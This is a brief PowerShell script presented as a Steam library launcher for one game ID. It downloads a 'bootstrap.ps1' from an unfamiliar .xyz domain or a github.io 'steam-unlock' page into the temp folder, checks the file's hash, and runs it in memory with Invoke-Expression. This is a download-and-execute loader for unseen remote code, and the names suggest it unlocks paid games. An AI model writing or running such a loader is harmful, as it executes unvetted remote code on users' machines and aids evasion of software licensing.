# Steam library launcher (AppID 424840)
# Review bootstrap.ps1 before running this file.
$env:OST_APPID = '424840'
$env:OST_YES   = '1'
$srcs = @('https://jiangqr2026.xyz/bootstrap.ps1', 'https://jiangqr2024.github.io/steam-unlock/bootstrap.ps1')
$bootFile = Join-Path $env:TEMP 'ost-bootstrap.ps1'
$ready = $false
foreach ($src in $srcs) {
    try {
        Invoke-WebRequest -Uri $src -OutFile $bootFile -TimeoutSec 12 -UseBasicParsing -ErrorAction Stop | Out-Null
        if ((Get-FileHash -LiteralPath $bootFile -Algorithm SHA256).Hash -eq 'FE3A4DB095A3C0CB8AD81EB13CD87D79148BEE80B400495FC32232FDDD3C3AB9') { $ready = $true; break }
    } catch { }
}
if (-not $ready) { throw 'Verified bootstrap unavailable. Use the offline package.' }
iex (Get-Content -LiteralPath $bootFile -Raw)